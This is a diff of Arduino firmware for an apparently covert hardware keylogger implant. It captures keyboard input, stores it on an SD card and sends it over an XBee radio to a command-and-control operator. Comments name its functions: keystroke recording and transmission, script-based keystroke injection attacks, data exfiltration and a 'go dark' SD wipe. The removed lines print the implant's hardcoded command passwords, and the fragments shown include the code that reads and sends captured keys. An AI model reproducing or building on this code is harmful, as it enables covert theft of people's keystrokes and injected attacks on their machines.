@@ -6,27 +6,10 @@
  * Using Serial 1 for now as interface with Xbee. This may change in the future
  * mySerial is a custom serial line added to handle incoming data from Trinket M0/keyboard
  * 
- * [ ]Added code to record time from last key press
- * [ ]Send out time from last key press when prompted for mode statuses
- * Update on 8/24/21 by Jonathan Fischer
- * 
- * ---passwords---
- * Activate: fOci0a25-x#p-u3?
- * Get Modes: YLwuhlTHEh1q7Ha!
- * Enable Tx Keystrokes: ce8hovfvemu@ap*B+H3s
- * Disable Tx Keystrokes: ce8hovevemu@ap*B+H3s
- * Enable Insomnia: jorLwabocUqeq6bRof$2
- * Disable Insomnia: jorLwbbocUqeq6bRof$2
- * Enable Keystroke Recorder: GatIQEMaNodE5L#p$T?l
- * Disable Keystroke Recorder: GatlQEMaNodE5L#p$T?l
- * Wipe SD Card/Stop Comm (Go Dark): 4+aJu2+6ATRES+ef_OtR
- * Launch Attack from Script: c01h2*+dIp?W3lpez*T=
- * Exfil Data File: 
- * Rx Attack Script: Jas?8jl2i2=p!aw#
- * Delete File: 5ec#?#l@1cRA9efe
- * Reset: mUrex$4retru?lPi
- * sendKeys: suHafU8i@=&ruxl$
- * printFiles: wEsLf9OZlsw$crLV
+ *Copyright 2022 Jonathan Fischer and Jeremy Miller
+ *Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+ *The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
+ *THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
  */
 
 #include <Arduino.h>
@@ -36,10 +19,6 @@
 #include <SPI.h>
 #include <SD.h>
 
-
-
-//Uart mySerial(&sercom2, ALT_SERCOM_RX, ALT_SERCOM_TX, PAD_mySerial_RX, PAD_mySerial_TX);
-
 Uart mySerial (&sercom0, 5, 6, SERCOM_RX_PAD_1, UART_TX_PAD_0);
 
 // Attach the interrupt handler to the SERCOM
@@ -47,7 +26,6 @@ void SERCOM0_Handler()
 {
     mySerial.IrqHandler();
 }
-
 
 //File myFile;
 String scriptName = "deleteMe.txt";
@@ -59,26 +37,25 @@ unsigned long currentMillis;
 unsigned long elapsedMillis;
 
 //password variables
-String activatePW = "fOci0a25-x#p-u3?";
-String getModesPW = "YLwuhlTHEh1q7Ha!";
-String recKeysEnablePW = "GatIQEMaNodE5L#p$T?l";
-String recKeysDisablePW = "GatlQEMaNodE5L#p$T?l";
-String txKeysPW = "ce8hovfvemu@ap*B+H3s";
-String disableKeyTxPW = "ce8hovevemu@ap*B+H3s";
-String insomniaPW = "jorLwabocUqeq6bRof$2";
-String allowSleepPW = "jorLwbbocUqeq6bRof$2";
-String goDarkPW = "4+aJu2+6ATRES+ef_OtR";
-String injectPW = "c01h2*+dIp?W3lpez*T=";
-String rxScriptPW = "Jas?8jl2i2=p!aw#";
-String resetPW = "5ec#?#l@1cRA9efe";
-String deletePW = "mUrex$4retru?lPi";
-String sendKeysPW = "suHafU8i@=&ruxl$";
-String printFilesPW = "wEsLf9OZlsw$crLV";
-String terminalPW = "dF2Gh@34G@#ga79!";
-String terminalPWOFF = "dF2Gh@34G@#ga80!";
-String exfilPW = "s$en*zET0aYozE!l-Tu0";
-String exfilPWOFF = "s$en*zET0aYozE!l-Tu2";
-
+String activatePW = "<<EXFIL_OFF_PASSWORD>>";
+String getModesPW = "<<EXFIL_OFF_PASSWORD>>";
+String recKeysEnablePW = "<<EXFIL_OFF_PASSWORD>>";
+String recKeysDisablePW = "<<EXFIL_OFF_PASSWORD>>";
+String txKeysPW = "<<EXFIL_OFF_PASSWORD>>";
+String disableKeyTxPW = "<<EXFIL_OFF_PASSWORD>>";
+String insomniaPW = "<<EXFIL_OFF_PASSWORD>>";
+String allowSleepPW = "<<EXFIL_OFF_PASSWORD>>";
+String goDarkPW = "<<EXFIL_OFF_PASSWORD>>";
+String injectPW = "<<EXFIL_OFF_PASSWORD>>";
+String rxScriptPW = "<<EXFIL_OFF_PASSWORD>>";
+String resetPW = "<<EXFIL_OFF_PASSWORD>>";
+String deletePW = "<<EXFIL_OFF_PASSWORD>>";
+String sendKeysPW = "<<EXFIL_OFF_PASSWORD>>";
+String printFilesPW = "<<EXFIL_OFF_PASSWORD>>";
+String terminalPW = "<<EXFIL_OFF_PASSWORD>>";
+String terminalPWOFF = "<<TERMINAL_OFF_PASSWORD>>";
+String exfilPW = "<<EXFIL_OFF_PASSWORD>>";
+String exfilPWOFF = "<<EXFIL_OFF_PASSWORD>>";
 
 //Toggle variables
 bool activate = false; //allow outgoing communication with C2
@@ -124,7 +101,6 @@ if (!SD.begin(4)) {
 Serial.println("initialization done.");
 }
 
-
 uint8_t params2bin(char *buf, uint8_t *outbuf, uint8_t outbuf_len)
 {
   char *p;
@@ -139,7 +115,6 @@ uint8_t params2bin(char *buf, uint8_t *outbuf, uint8_t outbuf_len)
   }
   return outbuf_count;
 }
-
 
 void loop() {   
 
@@ -171,7 +146,6 @@ void loop() {
   if (mySerial.available() > 0) {
     char c = mySerial.read();
 #ifdef Serial
-    //Serial.print("c 0x"); Serial.println(c, HEX);
 #endif
     if (c == '\n' || aLine_count >= sizeof(aLine)) {
       aLine[aLine_count] = '\0';
@@ -492,10 +466,7 @@ void sendKeyRecord(String n){
     while (myFile.available()){
       char data = myFile.read();
       if (data == '\n' or data == '\r'){ //detect end of line and stop populating string variable
-      //  if (line.length() > 1){ //don't send blank lines
-      //    //send the line for injection mapping
-      //    Serial1.print(line);
-      //  }
+
         line.concat(data);
         Serial.print("Sending line: ");
         Serial.println(line);
@@ -660,7 +631,7 @@ void saveScript(String n, String s){
 
 
 void reset(){
-  //resets all toggles to get out of any loop that it may be stuck in
+//resets all toggles to get out of any loop that it may be stuck in
 activate = false; //allow outgoing communication with C2
 txKeys = false;
 insomnia = false;
@@ -846,7 +817,6 @@ String getMod (byte m){
   }
   else if (m == 2) {
     //Don't print if shift is only modifier pressed
-    //output.concat("LtShft");
     m = m - 2;
   }
   if (m == 1) {
@@ -1257,7 +1227,6 @@ void txKeyPresses(byte txArray[81], byte count){
   }
  // return message;
   if (message != ""){
-    //Serial.print("TxArray first key value: "); Serial.println(txArray[1]);
     if (txArray[1] != 0) {
       Serial.print("Sending: ");Serial.println(message);
       Serial1.print(message);
